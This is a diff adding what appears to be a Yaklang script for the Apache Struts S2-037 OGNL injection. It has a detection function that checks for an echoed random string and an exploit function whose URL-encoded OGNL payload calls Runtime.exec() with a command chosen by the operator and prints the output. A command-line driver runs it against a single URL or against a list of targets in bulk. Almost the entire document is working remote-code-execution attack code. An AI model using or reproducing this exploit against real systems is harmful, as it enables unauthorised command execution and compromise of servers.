@@ -1,0 +1,69 @@
+func poc(url){
+    random_str = randstr(8)
+    payload = `/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.print(%23parameters.content%5B0%5D),%23wr.print(%23parameters.content%5B0%5D),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=` + random_str
+
+
+    rsp ,err = http.Get(url+payload,
+        http.ua(http.uarand()),     
+    )
+
+    if err != nil{
+        return
+    }
+    
+    data = http.GetAllBody(rsp /*type: *http.Response*/)
+
+    if re.Match(random_str /*type: string*/, data /*type: interface {}*/){
+        log.warn(url + " S2_037 found !!!")
+    }else{
+        log.debug(url + " S2_037 safe !!!" /*type: string*/)
+    }
+}
+
+
+func exp(url,cmd){
+    payload = `/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=` + codec.EncodeUrl(cmd /*type: interface {}*/)
+    rsp ,err = http.get(url+payload,
+        http.ua(http.uarand()),     
+    )
+
+    if err != nil{
+        return
+    }
+    
+    data = http.GetAllBody(rsp /*type: *http.Response*/)
+    println(string(data))
+}
+
+
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
